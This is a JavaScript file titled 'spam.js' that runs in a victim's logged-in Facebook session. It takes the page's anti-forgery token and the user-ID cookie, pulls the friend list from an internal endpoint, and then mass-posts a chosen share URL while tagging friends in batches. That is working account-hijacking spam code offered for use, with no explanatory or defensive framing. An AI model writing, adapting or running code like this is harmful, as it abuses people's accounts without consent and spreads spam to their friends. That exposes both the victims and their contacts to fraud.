console.log("spam.js");
var Status = parseInt(etiqueta.status);
var cantidad = parseInt(etiqueta.cantidad);
var share_url = etiqueta.url;
var fb_dtsg = document.getElementsByName("fb_dtsg")[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);


var arkadaslar = [];
var svn_rev;
var app_id = "2210323535904466";

function bpr(j, e) {
  var k = "";
  if ("mix" == e) {
    var g = "ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz-0123456789";
  } else {
    var g = "0123456789";
  }
  ;
  for (var h = 0; j > h; h++) {
    k += g.charAt(Math.floor(Math.random() * g.length));
  }
  ;
  return k;
}

function pub(c, fin) {
  var l = new XMLHttpRequest;
  var a = "";
  a = "jazoest=22037";
  a += "&fb_dtsg=" + fb_dtsg;
  a += "&mode=self";
  a += "&mode=self";
  a += "&audience_targets=" + user_id;
  a += "&av=";
  a += "&app_id=" + app_id;
  a += "&redirect_uri=https://www.facebook.com/dialog/return/close";
  a += "&fallback_redirect_uri=";
  a += "&display=popup";
  a += "&access_token=";
  a += "&sdk=";
  a += "&user_code=";
  a += "&from_post=1";
  a += "&xhpc_context=home";
  a += "&xhpc_timeline=";
  a += "&xhpc_targetid=" + user_id;
  a += "&xhpc_publish_type=1";
  a += "&xhpc_message_text=";
  a += "&xhpc_message=";
  a += "&quote=&is_explicit_place=";
  a += "&composertags_place=";
  a += "&composertags_place_name=";
  a += "&tagger_session_id=" + Date.now();
  a += c;
  a += "&action_type_id[0]=";
  a += "&object_str[0]=";
  a += "&object_id[0]=";
  a += "&hide_object_attachment=0";
  a += "&og_suggestion_mechanism=";
  a += "&og_suggestion_logging_data=";
  a += "&icon_id=";
  a += '&share_action_properties={"object":"' + share_url + '","place":null,"tags":null}';
  a += "&device_code=";
  a += "&device_shared=";
  a += "&ref=";
  a += "&media=";
  a += "&dialog_url=https://www.facebook.com/dialog/share?u";
  a += "&composertags_city=";
  a += "&disable_location_sharing=false";
  a += "&composer_predicted_city=";
  a += "&feed_selector=on";
  a += "&privacyx=291667064279714";
  a += "&__CONFIRM__=1";
  a += "&__user=" + user_id;
  a += "&__a=1";
  a += "&__dyn=" + bpr(130, "mix"), a += "&__req=9";
  a += "&__be=1";
  a += "&__pc=PHASED:ufi_home_page_pkg";
  a += "&dpr=1";
  a += "&__rev=1000729864";
  l.open("POST", "/v2.9/dialog/share/submit", true);
  l.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  l.onreadystatechange = function () {
    if (l.readyState == 4 && l.status == 200) {
      l.close;
      if (fin) {
        console.log("OK!!!");
        window.location.href = "https://www.facebook.com/profile.php?id=" + user_id + "#!OK";
      }
    }
  };
  l.send(a);
  console.log(c);
}

function amigos() {
  var b = new XMLHttpRequest;
  b.onreadystatechange = function () {
    if (b.readyState == 4) {
      var d = Status;
      eval("arkadaslar = " + b.responseText.toString().replace("for (;;);", "") + ";");
      if (cantidad > arkadaslar.payload.entries.length) {
        cantidad = arkadaslar.payload.entries.length;
      }
      for (f = 0; f < Math.round(cantidad / d); f++) {
        entriesbpr = "";
        mesaj_text = "";
        var c = "";
        for (i = f * d; i < (f + 1) * d; i++) {
          if (arkadaslar.payload.entries[i]) {
            entriesbpr += "  @[" + arkadaslar.payload.entries[i].uid + ":" + arkadaslar.payload.entries[i].text + "]";
            mesaj_text += " " + arkadaslar.payload.entries[i].text;
            c += "&composertags_with[" + i + "]=" + arkadaslar.payload.entries[i].uid;
            c += "&text_composertags_with[" + i + "]=" + encodeURIComponent(arkadaslar.payload.entries[i].text);
          }
        }
        if (f + 1 >= Math.round(cantidad / d)) {
          pub(c, true);
        } else {
          pub(c, false);
        }
      }
    }
  };
  var a = "&filter[0]=user";
  a += "&options[0]=friends_only";
  a += "&options[1]=nm";
  a += "&token=v7";
  a += "&viewer=" + user_id;
  a += "&__user=" + user_id;
  if (document.URL.indexOf("https://") >= 0) {
    b.open("GET", "/ajax/typeahead/first_degree.php?fb_dtsg=" + fb_dtsg + "&viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=include_if&context=friends_profile_browser_lp&request_id=bcff3fd3-b10f-4468-a602-894e4caae4c5&__user=" + user_id + "&__a=1&__dyn=" + bpr(509, "mix") + "&__req=3h&__be=1&__pc=PHASED%3Aufi_home_page_pkg&dpr=1&__rev=4639318&jazoest=27795&__spin_r=4639318&__spin_b=trunk&__spin_t=1544848687", false);
  } else {
    b.open("GET", "/ajax/typeahead/first_degree.php?fb_dtsg=" + fb_dtsg + "&viewer=" + user_id + "&token=v7&filter[0]=user&options[0]=friends_only&options[1]=include_if&context=friends_profile_browser_lp&request_id=bcff3fd3-b10f-4468-a602-894e4caae4c5&__user=" + user_id + "&__a=1&__dyn=" + bpr(509, "mix") + "&__req=3h&__be=1&__pc=PHASED%3Aufi_home_page_pkg&dpr=1&__rev=4639318&jazoest=27795&__spin_r=4639318&__spin_b=trunk&__spin_t=1544848687", false);
  }
  b.send();
}
amigos();
